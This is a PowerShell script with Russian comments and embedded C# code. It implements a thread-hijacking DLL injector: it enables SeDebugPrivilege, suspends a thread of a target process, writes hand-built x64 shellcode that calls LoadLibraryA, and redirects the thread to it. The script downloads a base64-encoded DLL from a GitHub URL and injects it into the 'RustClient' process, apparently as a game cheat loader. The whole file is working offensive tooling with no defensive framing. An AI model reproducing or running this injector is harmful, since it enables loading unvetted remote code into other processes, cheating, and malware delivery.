<#
    Thread Hijacking DLL Injector v2 (с исправлением ошибки 998).
    Ключевые изменения:
    - Точная, явно выровненная структура CONTEXT для x64.
    - Принудительное включение SeDebugPrivilege.
#>

$ErrorActionPreference = 'Stop'

# --- C# код для Thread Hijacking с исправленной структурой CONTEXT ---
$HijackCode = @"
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public static class ThreadHijacker
{
    // --- P/Invoke объявления ---
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint SuspendThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext); // Изменено на IntPtr!

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext); // Изменено на IntPtr!

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibraryA(string lpFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    // --- Структуры и константы ---
    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public long Luid;
        public uint Attributes;
    }

    // Точная структура CONTEXT для x64. Явное выравнивание и размер.
    [StructLayout(LayoutKind.Explicit, Size = 1232, Pack = 16)]
    public struct CONTEXT
    {
        [FieldOffset(0)] public ulong P1Home;
        [FieldOffset(8)] public ulong P2Home;
        [FieldOffset(16)] public ulong P3Home;
        [FieldOffset(24)] public ulong P4Home;
        [FieldOffset(32)] public ulong P5Home;
        [FieldOffset(40)] public ulong P6Home;

        [FieldOffset(48)] public uint ContextFlags;
        [FieldOffset(52)] public uint MxCsr;

        [FieldOffset(56)] public ushort SegCs;
        [FieldOffset(58)] public ushort SegDs;
        [FieldOffset(60)] public ushort SegEs;
        [FieldOffset(62)] public ushort SegFs;
        [FieldOffset(64)] public ushort SegGs;
        [FieldOffset(66)] public ushort SegSs;
        [FieldOffset(68)] public uint EFlags;

        [FieldOffset(72)] public ulong Dr0;
        [FieldOffset(80)] public ulong Dr1;
        [FieldOffset(88)] public ulong Dr2;
        [FieldOffset(96)] public ulong Dr3;
        [FieldOffset(104)] public ulong Dr6;
        [FieldOffset(112)] public ulong Dr7;

        [FieldOffset(120)] public ulong Rax;
        [FieldOffset(128)] public ulong Rcx;
        [FieldOffset(136)] public ulong Rdx;
        [FieldOffset(144)] public ulong Rbx;
        [FieldOffset(152)] public ulong Rsp; // Смещение 152
        [FieldOffset(160)] public ulong Rbp;
        [FieldOffset(168)] public ulong Rsi;
        [FieldOffset(176)] public ulong Rdi;
        [FieldOffset(184)] public ulong R8;
        [FieldOffset(192)] public ulong R9;
        [FieldOffset(200)] public ulong R10;
        [FieldOffset(208)] public ulong R11;
        [FieldOffset(216)] public ulong R12;
        [FieldOffset(224)] public ulong R13;
        [FieldOffset(232)] public ulong R14;
        [FieldOffset(240)] public ulong R15;
        [FieldOffset(248)] public ulong Rip; // Смещение 248
    }

    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    public const uint THREAD_ALL_ACCESS = 0x1F03FF;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint MEM_RELEASE = 0x8000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint CONTEXT_FULL = 0x00100007; // CONTEXT_AMD64 | CONTEXT_CONTROL | CONTEXT_INTEGER

    // --- Включение SeDebugPrivilege ---
    private static void EnableDebugPrivilege()
    {
        IntPtr hToken;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, 0x0020 | 0x0008, out hToken)) // TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
            return;

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        if (LookupPrivilegeValue(null, "SeDebugPrivilege", out tp.Luid))
        {
            tp.Attributes = 0x00000002; // SE_PRIVILEGE_ENABLED
            AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        }
        CloseHandle(hToken);
    }

    public static void Inject(int pid, string dllPath)
    {
        EnableDebugPrivilege(); // Включаем привилегию

        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hProcess == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess failed");

        IntPtr hThread = IntPtr.Zero;
        IntPtr pContext = IntPtr.Zero; // Память для структуры CONTEXT
        IntPtr remoteDllPath = IntPtr.Zero;
        IntPtr remoteCodeCave = IntPtr.Zero;
        IntPtr remoteReturn = IntPtr.Zero;
        bool threadSuspended = false;

        try
        {
            // 1. Находим поток
            Process proc = Process.GetProcessById(pid);
            ProcessThread targetThread = null;
            foreach (ProcessThread t in proc.Threads) { targetThread = t; break; }
            if (targetThread == null) throw new Exception("No thread found.");

            hThread = OpenThread(THREAD_ALL_ACCESS, false, (uint)targetThread.Id);
            if (hThread == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenThread failed");

            // 2. Приостанавливаем поток
            if (SuspendThread(hThread) == 0xFFFFFFFF)
                throw new Win32Exception(Marshal.GetLastWin32Error(), "SuspendThread failed");
            threadSuspended = true;

            // 3. Выделяем выровненную память для CONTEXT
            // Используем Marshal.AllocHGlobal с выравниванием, или просто AllocHGlobal, но структура уже с Pack=16
            pContext = Marshal.AllocHGlobal(Marshal.SizeOf<CONTEXT>());
            CONTEXT ctx = new CONTEXT();
            ctx.ContextFlags = CONTEXT_FULL;
            Marshal.StructureToPtr(ctx, pContext, false);

            // 4. Получаем контекст (теперь с правильным указателем)
            if (!GetThreadContext(hThread, pContext))
                throw new Win32Exception(Marshal.GetLastWin32Error(), "GetThreadContext failed");

            // Читаем контекст обратно
            ctx = Marshal.PtrToStructure<CONTEXT>(pContext);
            ulong originalRip = ctx.Rip;
            ulong originalRsp = ctx.Rsp;

            // 5. Выделяем память в целевом процессе
            byte[] pathBytes = Encoding.ASCII.GetBytes(dllPath + "\0");
            remoteDllPath = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)pathBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (remoteDllPath == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualAllocEx for path failed");
            UIntPtr written;
            if (!WriteProcessMemory(hProcess, remoteDllPath, pathBytes, (uint)pathBytes.Length, out written))
                throw new Win32Exception(Marshal.GetLastWin32Error(), "WriteProcessMemory for path failed");

            remoteReturn = VirtualAllocEx(hProcess, IntPtr.Zero, 8, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            remoteCodeCave = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (remoteReturn == IntPtr.Zero || remoteCodeCave == IntPtr.Zero)
                throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualAllocEx for shellcode failed");

            // 6. Получаем адрес LoadLibraryA
            IntPtr kernel32 = GetModuleHandle("kernel32.dll");
            IntPtr loadLibraryAddr = GetProcAddress(kernel32, "LoadLibraryA");
            if (loadLibraryAddr == IntPtr.Zero) throw new Exception("GetProcAddress LoadLibraryA failed");

            // 7. Строим shellcode (x64)
            byte[] shellcode;
            using (var ms = new System.IO.MemoryStream())
            {
                var bw = new System.IO.BinaryWriter(ms);
                // mov rcx, <remoteDllPath>
                bw.Write((byte)0x48); bw.Write((byte)0xB9); bw.Write((ulong)remoteDllPath.ToInt64());
                // mov rax, <loadLibraryAddr>
                bw.Write((byte)0x48); bw.Write((byte)0xB8); bw.Write((ulong)loadLibraryAddr.ToInt64());
                // sub rsp, 0x28
                bw.Write(new byte[] { 0x48, 0x83, 0xEC, 0x28 });
                // call rax
                bw.Write(new byte[] { 0xFF, 0xD0 });
                // add rsp, 0x28
                bw.Write(new byte[] { 0x48, 0x83, 0xC4, 0x28 });
                // mov [remoteReturn], rax (сохраняем результат)
                bw.Write(new byte[] { 0x48, 0xA3 }); bw.Write((ulong)remoteReturn.ToInt64());
                // mov rax, <originalRip> (возврат)
                bw.Write((byte)0x48); bw.Write((byte)0xB8); bw.Write(originalRip);
                // jmp rax
                bw.Write(new byte[] { 0xFF, 0xE0 });
                shellcode = ms.ToArray();
            }

            if (!WriteProcessMemory(hProcess, remoteCodeCave, shellcode, (uint)shellcode.Length, out written))
                throw new Win32Exception(Marshal.GetLastWin32Error(), "WriteProcessMemory for shellcode failed");

            // 8. Подменяем контекст
            ctx.Rip = (ulong)remoteCodeCave.ToInt64();
            // RSP оставляем прежним, так как shellcode сам выровняет стек и вернет его обратно
            Marshal.StructureToPtr(ctx, pContext, false);

            if (!SetThreadContext(hThread, pContext))
                throw new Win32Exception(Marshal.GetLastWin32Error(), "SetThreadContext failed");

            // 9. Возобновляем поток
            if (ResumeThread(hThread) == 0xFFFFFFFF)
                throw new Win32Exception(Marshal.GetLastWin32Error(), "ResumeThread failed");
            threadSuspended = false;

            Thread.Sleep(1000); // Ждем загрузки DLL
        }
        finally
        {
            if (threadSuspended && hThread != IntPtr.Zero)
            {
                try { ResumeThread(hThread); } catch { }
            }
            if (pContext != IntPtr.Zero) Marshal.FreeHGlobal(pContext);
            if (remoteCodeCave != IntPtr.Zero) VirtualFreeEx(hProcess, remoteCodeCave, 0, MEM_RELEASE);
            if (remoteDllPath != IntPtr.Zero) VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
            if (remoteReturn != IntPtr.Zero) VirtualFreeEx(hProcess, remoteReturn, 0, MEM_RELEASE);
            if (hThread != IntPtr.Zero) CloseHandle(hThread);
            if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
        }
    }
}
"@

if (-not ([System.Management.Automation.PSTypeName]'ThreadHijacker').Type) {
    Add-Type -TypeDefinition $HijackCode -Language CSharp
}

# --- Параметры и остальная часть скрипта (без изменений) ---
$Url = "https://raw.githubusercontent.com/PUZAN1337/-/refs/heads/main/svin.dll"
$TargetProcessName = "RustClient"

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) { Write-Host "[!] Требуются права администратора." -ForegroundColor Red; return }

try {
    $b64 = (Invoke-RestMethod -Uri $Url -UseBasicParsing -ErrorAction Stop) -replace '\s', ''
    Write-Host "[+] Base64 length: $($b64.Length)" -ForegroundColor Green
    $dllBytes = [System.Convert]::FromBase64String($b64)
} catch { Write-Error "Download/decode: $($_.Exception.Message)"; return }
if ($dllBytes[0] -ne 0x4D -or $dllBytes[1] -ne 0x5A) { Write-Warning "No MZ header."; return }

$tempDll = Join-Path $env:TEMP ("svin_{0}.dll" -f ([Guid]::NewGuid().ToString('N')))
[System.IO.File]::WriteAllBytes($tempDll, $dllBytes)
Write-Host "[+] DLL сохранена: $tempDll" -ForegroundColor Yellow

$p = Get-Process -Name $TargetProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $p) {
    Write-Host "[!] Процесс '$TargetProcessName' не найден." -ForegroundColor Yellow
    Remove-Item $tempDll -Force -ErrorAction SilentlyContinue
    return
}
Write-Host "[+] Target: $($p.ProcessName) (PID $($p.Id))" -ForegroundColor Cyan

try {
    [ThreadHijacker]::Inject($p.Id, $tempDll)
    Write-Host "[+] Thread Hijacking инъекция выполнена." -ForegroundColor Green
} catch {
    Write-Host "[!] Ошибка инъекции: $($_.Exception.Message)" -ForegroundColor Red
} finally {
    Start-Sleep -Milliseconds 500
    Remove-Item $tempDll -Force -ErrorAction SilentlyContinue
}
